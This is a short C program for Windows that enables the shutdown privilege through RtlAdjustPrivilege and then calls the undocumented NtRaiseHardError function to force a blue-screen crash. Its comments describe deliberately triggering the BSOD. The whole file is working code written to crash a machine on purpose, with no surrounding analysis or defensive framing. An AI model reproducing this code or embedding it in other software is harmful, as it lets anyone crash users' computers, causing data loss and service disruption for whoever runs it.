#include <Windows.h>
#include <ntstatus.h>
#include<winternl.h>

// function definitions
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege) (
	ULONG privilege,
	BOOLEAN enable,
	BOOLEAN current_thread,
	PBOOLEAN enabled);

typedef NTSTATUS(NTAPI* pf_NtRaiseError) (
	NTSTATUS error_status,
	ULONG number_of_param,
	PUNICODE_STRING UnicodeStringParameterMask,
	PVOID* param,
	ULONG ResponseOption,
	PULONG Response
	);

int main()
{
	pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	BOOLEAN g;
	if (RtlAdjustPrivilege(19, TRUE, FALSE, &g) == 0)
	{
		//NtRaiseHardError is a way to raise errors inside ntdll.dll . Now sice ntdll.dll deals with the userland to kernel transition, we are knowingly invoking a hard exception inside kernel that triggers BSOD.
		//BDOS is exception error and hence NtRaiseHardError does the trick.
		pf_NtRaiseError NtRaiseHardError = (pf_NtRaiseError)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtRaiseHardError");
		ULONG op;
		NtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, 0, 6, &op);
	}
}

